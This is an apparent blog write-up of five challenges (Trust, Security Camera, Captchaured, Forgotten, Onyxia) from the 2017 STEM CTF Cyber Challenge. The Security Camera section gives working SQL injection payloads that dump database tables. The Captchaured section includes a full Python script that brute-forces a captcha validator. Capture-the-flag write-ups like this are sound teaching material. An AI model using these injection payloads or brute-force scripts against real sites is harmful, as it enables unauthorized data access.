---
layout: single
title: "STEM CTF: Cyber Challenge 2017 Write Up"
date: 2017-09-16
categories:
  - ctf
  - write-ups
tags:
  - stem
  - mitre
  - cyber academy
---
# Challenge: Trust
## Description
I'd like to file a complaint about your website, it doesn't work correctly.

## Categories
Web

## Points
50

## Solution
Viewing the page showed a message which seemingly contained the flag:

> Most doggos have 4 legs Many doggos have collars with their name or ID number on a tag. The most common tag number is, MCA{C0PYING_1z_d@ng3r0us}. no one really knows why this is such a popular number Doggos make good friends

Trying to copy this straight from the web page, however, resulted in the value being changed by the following script:

```javascript
function addLink() {
  //Get the selected text and append the extra info
  var selection = window.getSelection();
  var copytext = selection.toString();
    copytext = copytext.replace("G_1z", "G_lz");
    newdiv = document.createElement('div');

  //hide the newly created container
  newdiv.style.position = 'absolute';
  newdiv.style.left = '-99999px';

  //insert the container, fill it with the extended text, and define the new selection
  document.body.appendChild(newdiv);
  newdiv.innerHTML = copytext;
  selection.selectAllChildren(newdiv);

  window.setTimeout(function () {
    document.body.removeChild(newdiv);
  }, 100);
}


if (/MSIE \d|Trident.*rv:/.test(navigator.userAgent)) {
  document.getElementById('main-content').style.display = 'none';
  document.getElementById("main-content").style.visibility = "hidden";
}
else {
  document.getElementById('noIE').style.display = 'none';
  document.getElementById("noIE").style.visibility = "hidden";  
  document.addEventListener('copy', addLink);
}
```

As it was just replacing `G_1z` with `G_lz`, solving this was just a case of reverting t he replacement to get the flag.

**Flag:** `MCA{C0PYING_1z_d@ng3r0us}`

<hr>

# Challenge: Security Camera
## Description
That home security camera I purchased was so BAD! I could only get ten frames per second on my eight core processor so I had to return it. I wonder what kind of frame rate the next person gets...

## Categories
Web

## Points
100

## Solution
The login page was not vulnerable to an SQL injection, and all attempts at brute forcing a valid username failed; the registration form, however, was.

Attempting to register with the payload `' union select 99 -- -` as the username field resulted in the value `99` being echoed back in the response. Increasing the number of columns in the UNION resulted in an error, as did trying to select a non-numeric value.

Trying a stacked query, allowed for the selection of an unlimited number of columns of any type; all of which, were included in the output. Using the payload `a'; SELECT table_name from information_schema.tables -- -`, I was able to get the table listing.

The only two tables in the database were `cameras` and `sqlmapfile`. The `sqlmapfile` table contained one record with a lot of white space; presumably to slow down anyone enumerating the database with sqlmap and a blind query.

Using `a'; SELECT column_name from information_schema.columns where table_name = 'cameras' -- -` to retrieve the columns of the `cameras` table showed that there was a `serial` column and a `username` column.

I selected the data using `'; SELECT username, serial FROM cameras -- -` and found there to be only a single record in the table, with a username value of `The Watcher` and a serial number of `2296354227`.

I tried logging in using the username and serial number from this table, but the web page indicates that `The Watcher` is not a valid username.

Next, I went back to the registration page, and created a new account, using `2296354227` as the serial number for the new account; this then logged me in and showed me a security camera feed with the flag visible in the video:

![](/assets/images/stem-ctf-cyber-challenge-2017-write-up/security_camera.png)

**Flag:** `MCA{oM0kcuLkPk}`

<hr>

# Challenge: Captchaured
## Description
We're gonna catch all the bots with our new patented "Bot Detection System".

## Categories
Web

## Points
150

## Solution
All the images provided by the captcha were broken, which prevented me being able to know which ones to select (the point of the challenge).

After looking at the source code, I could see that the validation was being handled externally by `http://10.0.2.15/captcha/validate`, and that the captcha wasn't session specific and had no expiration. If the incorrect combination was sent, the return value from the `validate` route would contain the word `Incorrect`.

As there was no limit on the number of requests that could be sent to the validator, and due to there being a **very** small number of combinations, the process is easily brute forced.

I wrote a small Python script to find all possible combinations, and keep submitting them, using the same method as the web application, until the validator returned something that didn't contain the word `Incorrect`; the result was:

```shell_session
root@kali:~# python web.py 392
('on', 'on', 'on', 'on', 'on', 'on')
('on', 'on', 'on', 'on', 'on', 'off')
('on', 'on', 'on', 'on', 'off', 'on')
('on', 'on', 'on', 'on', 'off', 'off')
('on', 'on', 'on', 'off', 'on', 'on')
('on', 'on', 'on', 'off', 'on', 'off')
('on', 'on', 'on', 'off', 'off', 'on')
('on', 'on', 'on', 'off', 'off', 'off')
('on', 'on', 'off', 'on', 'on', 'on')
('on', 'on', 'off', 'on', 'on', 'off')
('on', 'on', 'off', 'on', 'off', 'on')
('on', 'on', 'off', 'on', 'off', 'off')
('on', 'on', 'off', 'off', 'on', 'on')
('on', 'on', 'off', 'off', 'on', 'off')
('on', 'on', 'off', 'off', 'off', 'on')
('on', 'on', 'off', 'off', 'off', 'off')
<h1>Here is your flag: ---------------------2-------------------------------</h1>
```

After seeing this strange output, I tried the last combination manually in the web page and got the same result; which confirmed the output was definitely correct.

As there were a number of dashes, I presumed that maybe multiple captchas need to be solved. The argument passed to my script was the value that was being passed to the `qid` parameter originally.

So, I refreshed the page to get a new valid `qid` and tried again, which led to a different character being revealed. I tried this a third time, with a `qid` that was one step below the original, and confirmed that I could just step through them sequentially and retrieve all the characters:

```
---------------------2------------------------------- 392
------------------------------S---------------------- 613
--------------------W-------------------------------- 391
```

As there were 53 characters in total, I modified my script to repeat the process I'd previously used to step through the range of 0-52 and use this as the `qid` and build up the full flag.

The final script was:

```python
import itertools
import requests
import re

flag = ''
regex = re.compile('Here is your flag: [-]{0,}?([^-]){1}')
for i in range(0, 53):
    print 'Fetching character {offset} / 52...'.format(offset = i)
    for c in itertools.product(['on', 'off'], repeat=6):
        p = {}

        p['qid'] = i

        if c[0] == 'on':
            p['cb0'] = 'on'

        if c[1] == 'on':
            p['cb1'] = 'on'

        if c[2] == 'on':
            p['cb2'] = 'on'

        if c[3] == 'on':
            p['cb3'] = 'on'

        if c[4] == 'on':
            p['cb4'] = 'on'

        if c[5] == 'on':
            p['cb5'] = 'on'

        r = requests.get("http://10.0.2.15/captcha/validate", params= p, allow_redirects=False)

        if "Incorrect" not in r.text:
            m = regex.search(r.text)
            flag += m.group(1)
            break

print 'Flag: {flag}'.format(flag = flag)
```

After around 10 minutes, the script finished running, and the flag was recovered:

```
Fetching character 48 / 52...
Fetching character 49 / 52...
Fetching character 50 / 52...
Fetching character 51 / 52...
Fetching character 52 / 52...
Flag: MCA{LIzdfHTUNUuZBhFKW20CChxJbRSNZbvv0SGnyEXkcrn9bPEz}
```

**Flag:** `MCA{LIzdfHTUNUuZBhFKW20CChxJbRSNZbvv0SGnyEXkcrn9bPEz}`

<hr>

# Challenge: Forgotten
## Description
All these rules about letters, numbers, and symbols. I always keep forgetting.

## Categories
Forensics

## Points
50

## Solution
The challenge provided a traffic capture file, opening it up in Wireshark showed an SMTP conversation which contained a password reset e-mail:

```shell_session
EHLO default-VirtualBox.localdomain
MAIL FROM:<default@default-VirtualBox> SIZE=770
RCPT TO:<ctf@mitre.org> ORCPT=rfc822;ctf@mitre.org
DATA
250 2.1.0 Ok
250 2.1.5 Ok
354 End data with <CR><LF>.<CR><LF>
Received: by default-VirtualBox.localdomain (Postfix, from userid 1000)
	id 17CE26F300; Tue, 16 May 2017 14:21:32 -0400 (EDT)
Content-type: text/html;
Subject: Forgot Your Password?
To: <ctf@mitre.org>
X-Mailer: mail (GNU Mailutils 2.99.99)
Message-Id: <20170516182132.17CE26F300@default-VirtualBox.localdomain>
Date: Tue, 16 May 2017 14:21:32 -0400 (EDT)
From: default@default-VirtualBox (default)

<!DOCTYPE html>
<html>
<head>
	<title>Password Reset Email</title>
</head>
<body>
	We hear you have forgotten your password.<br>
	Not to worry.  You can click <a href="https://www.aSuperRealWebsite.notFake/users/password/edit?resetPasswordToken=TUNBezU4MDc2MjY2NzZ9">this link</a> to reset your password!<br><br>
	Have a great day!
</body>
</html>
.
QUIT
250 2.0.0 Ok: queued as B705C6CC00F
221 2.0.0 Bye
```

The reset token found in the link of the e-mail was a base64 string, which could be decoded to retrieve the flag.

**Flag:** `MCA{5807626676}`

<hr>

# Challenge: Onyxia
## Description
Odd groups go to the left, even groups go to the right. Seven and eight are whelp groups.

## Categories
Forensics

## Points
100

## Solution
The challenge provided four VHD files in the download. Using `binwalk` on each drive revealed nothing, other than on `HDD_1.vhd` and `HDD_3.vhd`, which found a PNG header in both:

```shell_session
root@kali:~# binwalk HDD_1.vhd

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
1662464       0x195E00        PNG image, 1055 x 524, 8-bit/color RGB, non-interlaced
1662555       0x195E5B        Zlib compressed data, compressed

root@kali:~# binwalk HDD_3.vhd

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
1662464       0x195E00        PNG image, 1055 x 524, 8-bit/color RGB, non-interlaced
1662555       0x195E5B        Zlib compressed data, compressed
```

Next, I added these drives to a virtual machine, and used `fdisk -l` to identify them as devices sdb, sdc, sdd and sde and tried to mount them, but each attempt failed with the error:

```
mount: unknown filesystem type 'linux_raid_member'
```

As it was clear, these drives were part of a raid array, I used `mdadm` to re-assemble the array:

```shell_session
root@kali:/mnt/pwn# mdadm --assemble --run /dev/md0 /dev/sdb /dev/sdc /dev/sdd /dev/sde
mdadm: /dev/md0 has been started with 3 drives and 1 spare.
```

Once re-assembled, I mounted the new device and found the PNG file previously identified by `binwalk`:

```shell_session
root@kali:/mnt# mount /dev/md0p1 /mnt/pwn
root@kali:/mnt# ls -la /mnt/pwn
total 180
drwxr-xr-x 2 root root    512 Jan  1  1970 .
drwxr-xr-x 7 root root   4096 Sep 15 22:31 ..
-rwxr-xr-x 1 root root 179659 Jun 12 13:50 save.png
```

Opening this image revealed the final flag:

![](/assets/images/stem-ctf-cyber-challenge-2017-write-up/onyxia.png)

**Flag:** `MCA{RA1D3rs_0f_the_L0sT_bits}`
